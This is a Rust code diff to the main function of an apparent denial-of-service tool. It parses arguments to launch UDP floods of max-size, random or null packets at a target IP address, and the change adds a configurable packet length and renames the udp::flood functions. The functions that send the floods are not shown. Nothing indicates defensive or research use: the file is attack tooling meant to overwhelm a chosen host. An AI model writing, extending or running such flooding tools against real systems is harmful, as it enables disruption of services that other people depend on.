@@ -3,6 +3,7 @@ mod udp;
 
 fn main(){
 	let args: Vec<String> = env::args().collect();
+	let mut pack_len: u16 = 65507;
 	
 	if args.len() <= 1 {
 		println!("Need more than one arguments!!");
@@ -19,21 +20,29 @@ fn main(){
 		
 		println!("No {} type specified!", attack_type);
 		std::process::exit(1);
+		
 	} else if args.len() == 4 {
-		println!("No ip address specified!");
+		println!("No IP address specified!");
 		std::process::exit(1);
+		
+	} else if args.len() == 5 {
+		println!("No packet length specified! Defaulting to 65507 (max size)");
+		
+	} else if args.len() == 6 {
+		pack_len = args[5].parse::<u16>().unwrap();
+		
 	}
 	
 	if args[1] == "udp" {
 		if args[2] == "--flood" || args[2] == "-f" {
 			if args[3] == "--max" || args[3] == "-m" {
-				udp::flood::max_packets(&args[4], args[5].parse::<u16>().unwrap());
+				udp::flood::max(&args[4], pack_len);
 				
 			} else if args[3] == "--random" || args[3] == "-r" {
-				udp::flood::rand_packets(&args[4], args[5].parse::<u16>().unwrap());
+				udp::flood::rnd(&args[4], pack_len);
 				
 			} else if args[3] == "--null" || args[3] == "-n" { 
-				udp::flood::null_packets(&args[4]);
+				udp::flood::null(&args[4]);
 			} else {
 				println!("Invalid UDP flood attack type!");
 			}
